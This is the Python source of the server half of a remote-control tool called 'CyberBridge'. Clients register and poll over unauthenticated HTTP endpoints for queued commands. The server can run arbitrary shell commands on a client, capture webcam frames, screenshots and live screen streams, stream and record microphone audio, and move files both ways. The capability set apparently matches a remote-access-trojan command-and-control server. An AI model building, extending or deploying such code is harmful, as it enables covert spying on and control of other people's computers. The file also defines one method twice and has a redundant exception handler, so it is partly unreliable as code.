"""
CyberBridge - Server HTTP Session Manager
Replaces UDP beacon + RPyC with pure HTTP polling.
The client POSTs /register to announce itself, then polls /commands/<id>
to pick up queued commands and POSTs /result/<id> with the output.
"""

import json
import threading
import time
import uuid
import base64
import logging
import queue
from typing import Dict, Optional, Callable

logger = logging.getLogger("cyberbridge.server")


# ─── Client Session ───────────────────────────────────────────────────────────

class ClientSession:
    """Represents a remote client registered via HTTP."""

    IDLE_TIMEOUT    = 20   # last_seen > 20s → IDLE
    OFFLINE_TIMEOUT = 60   # last_seen > 60s → OFFLINE

    def __init__(self, client_id: str, hostname: str, ip: str, port: int = 0):
        self.client_id   = client_id
        self.hostname    = hostname
        self.ip          = ip
        self.port        = port
        self.last_seen   = time.time()
        self.connected   = True

        self._cmd_queue: queue.Queue = queue.Queue()
        self._results: Dict[str, dict] = {}
        self._result_events: Dict[str, threading.Event] = {}
        self._lock = threading.Lock()

    # ── Status ────────────────────────────────────────────────────────────────

    @property
    def status_str(self) -> str:
        age = time.time() - self.last_seen
        if age < self.IDLE_TIMEOUT:
            return "ONLINE"
        elif age < self.OFFLINE_TIMEOUT:
            return "IDLE"
        else:
            return "OFFLINE"

    def touch(self):
        self.last_seen = time.time()

    # ── Command dispatch ──────────────────────────────────────────────────────

    def _enqueue(self, cmd_type: str, payload: dict = None, timeout: int = 30) -> dict:
        """Enqueue a command and block until the client responds (or times out)."""
        cmd_id = str(uuid.uuid4())
        event  = threading.Event()

        with self._lock:
            self._result_events[cmd_id] = event

        self._cmd_queue.put({
            "id":      cmd_id,
            "type":    cmd_type,
            "payload": payload or {},
        })

        if not event.wait(timeout=timeout):
            with self._lock:
                self._result_events.pop(cmd_id, None)
            raise TimeoutError(f"Command '{cmd_type}' timed out after {timeout}s")

        with self._lock:
            result = self._results.pop(cmd_id, {})
            self._result_events.pop(cmd_id, None)

        return result

    def deliver_result(self, cmd_id: str, result: dict):
        """Called by the HTTP handler when a client POSTs a result."""
        with self._lock:
            self._results[cmd_id] = result
            ev = self._result_events.get(cmd_id)
        if ev:
            ev.set()

    def pop_commands(self) -> list:
        """Drain all pending commands from the queue (for client polling)."""
        cmds = []
        while True:
            try:
                cmds.append(self._cmd_queue.get_nowait())
            except queue.Empty:
                break
        return cmds

    # ── Remote API (mirrors old RPyC interface) ───────────────────────────────

    def ping(self) -> bool:
        try:
            r = self._enqueue("ping", timeout=10)
            return r.get("value") == "pong"
        except Exception:
            return False

    def get_system_info(self) -> dict:
        try:
            r = self._enqueue("get_system_info", timeout=15)
            return r.get("value", {})
        except Exception as e:
            return {"error": str(e)}

    def execute_command(self, cmd: str) -> dict:
        try:
            r = self._enqueue("execute_command", {"command": cmd}, timeout=35)
            return r.get("value", {"stdout": "", "stderr": "timeout", "returncode": -1})
        except Exception as e:
            return {"stdout": "", "stderr": str(e), "returncode": -1}

    def get_camera_frame(self) -> bytes:
        try:
            r = self._enqueue("get_camera_frame", timeout=10)
            b64 = r.get("value", "")
            return base64.b64decode(b64) if b64 else b""
        except Exception:
            return b""

    def screenshot(self) -> bytes:
        try:
            r = self._enqueue("screenshot", timeout=15)
            b64 = r.get("value", "")
            return base64.b64decode(b64) if b64 else b""
        except Exception:
            return b""

    def screen_frame(self, quality: int = 45, scale: float = 0.65) -> bytes:
        try:
            r = self._enqueue("screen_frame",
                              {"quality": quality, "scale": scale},
                              timeout=10)
            b64 = r.get("value", "")
            return base64.b64decode(b64) if b64 else b""
        except Exception:
            return b""

    def start_audio(self) -> bool:
        try:
            r = self._enqueue("start_audio_stream", timeout=10)
            return bool(r.get("value", False))
        except Exception:
            return False

    def stop_audio(self) -> bool:
        try:
            r = self._enqueue("stop_audio_stream", timeout=10)
            return bool(r.get("value", False))
        except Exception:
            return False

    def get_audio_chunk(self) -> bytes:
        try:
            r = self._enqueue("get_audio_chunk", timeout=8)
            b64 = r.get("value", "")
            return base64.b64decode(b64) if b64 else b""
        except Exception:
            return b""

    def start_audio_record(self) -> bool:
        try:
            r = self._enqueue("start_audio_record", timeout=10)
            return bool(r.get("value", False))
        except Exception:
            return False

    def list_directory(self, path: str) -> list:
        try:
            r = self._enqueue("list_directory", {"path": path}, timeout=15)
            return r.get("value", [])
        except Exception:
            return []

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """
        Reads local_path and sends it to remote_path on client.
        """
        try:
            with open(local_path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode()
            
            # Send the file data
            r = self._enqueue("upload_file", {
                "path": remote_path,
                "data": encoded
            }, timeout=600)  # 10 minutes timeout for upload
            
            return bool(r.get("value", False))
        except Exception as e:
            logging.error(f"Upload failed: {e}")
            return False

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """
        Reads remote_path from client and saves to local_path.
        """
        try:
            r = self._enqueue("download_file", {"path": remote_path}, timeout=600) # 10 minutes timeout for download
            data_b64 = r.get("value", "")
            if not data_b64:
                return False
            
            data = base64.b64decode(data_b64)
            with open(local_path, "wb") as f:
                f.write(data)
            return True
        except Exception as e:
            logging.error(f"Download failed: {e}")
            return False
        except Exception:
            return False

    def stop_audio_record(self) -> bytes:
        try:
            r = self._enqueue("stop_audio_record", timeout=60)
            b64 = r.get("value", "")
            return base64.b64decode(b64) if b64 else b""
        except Exception:
            return b""

    def list_directory(self, path: str) -> list:
        try:
            r = self._enqueue("list_directory", {"path": path}, timeout=15)
            return r.get("value", [])
        except Exception as e:
            return [{"error": str(e)}]

    # ── Compat stubs (HTTP is always "connected") ─────────────────────────────

    def connect(self, timeout: int = None) -> bool:
        return True

    def disconnect(self):
        pass

    def ensure_connected(self) -> bool:
        return True

    # ── Repr ──────────────────────────────────────────────────────────────────

    def __repr__(self):
        return f"<ClientSession {self.hostname}@{self.ip} [{self.status_str}]>"


# ─── Session Manager ──────────────────────────────────────────────────────────

class SessionManager:
    """
    Manages client sessions registered via HTTP.
    Starts a Flask HTTP server on HTTP_PORT.
    """

    HTTP_PORT = 18812

    def __init__(self, on_client_update: Optional[Callable] = None):
        self._sessions: Dict[str, ClientSession] = {}   # key = client_id
        self._lock      = threading.Lock()
        self._running   = False
        self._on_update = on_client_update

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def start(self):
        """Starts the Flask HTTP server in a background thread."""
        self._running = True
        app = self._create_flask_app()

        def _serve():
            try:
                from werkzeug.serving import make_server
                srv = make_server("0.0.0.0", self.HTTP_PORT, app)
                logger.info("HTTP server listening on port %d", self.HTTP_PORT)
                srv.serve_forever()
            except Exception as e:
                logger.error("HTTP server error: %s", e)

        t = threading.Thread(target=_serve, daemon=True)
        t.start()
        logger.info("SessionManager: HTTP server started on port %d", self.HTTP_PORT)

    def stop(self):
        self._running = False

    # ── Flask routes ──────────────────────────────────────────────────────────

    def _create_flask_app(self):
        from flask import Flask, request, jsonify
        app = Flask("cyberbridge")

        import logging as _lg
        _lg.getLogger("werkzeug").setLevel(_lg.WARNING)

        @app.route("/register", methods=["POST"])
        def register():
            data      = request.get_json(force=True, silent=True) or {}
            hostname  = data.get("hostname", request.remote_addr)
            ip        = data.get("ip", request.remote_addr)
            port      = int(data.get("port", 0))
            client_id = data.get("client_id") or str(uuid.uuid4())

            with self._lock:
                if client_id in self._sessions:
                    self._sessions[client_id].touch()
                else:
                    session = ClientSession(client_id, hostname, ip, port)
                    self._sessions[client_id] = session
                    logger.info("New client registered: %s (%s)", hostname, client_id)

            if self._on_update:
                self._on_update()

            return jsonify({"status": "ok", "client_id": client_id})

        @app.route("/commands/<client_id>", methods=["GET"])
        def get_commands(client_id):
            with self._lock:
                session = self._sessions.get(client_id)
            if not session:
                return jsonify({"error": "unknown client"}), 404
            session.touch()
            if self._on_update:
                self._on_update()
            return jsonify({"commands": session.pop_commands()})

        @app.route("/result/<client_id>", methods=["POST"])
        def post_result(client_id):
            with self._lock:
                session = self._sessions.get(client_id)
            if not session:
                return jsonify({"error": "unknown client"}), 404
            session.touch()
            data   = request.get_json(force=True, silent=True) or {}
            cmd_id = data.get("id")
            result = data.get("result", {})
            if cmd_id:
                session.deliver_result(cmd_id, result)
            return jsonify({"status": "ok"})

        @app.route("/ping", methods=["GET"])
        def server_ping():
            return jsonify({"status": "ok", "server": "cyberbridge"})

        return app

    # ── Session access ────────────────────────────────────────────────────────

    def get_sessions(self) -> list:
        with self._lock:
            return list(self._sessions.values())

    def get_session(self, key: str) -> Optional[ClientSession]:
        with self._lock:
            return self._sessions.get(key)

    def remove_session(self, key: str):
        with self._lock:
            self._sessions.pop(key, None)

    def session_count(self) -> int:
        with self._lock:
            return len(self._sessions)
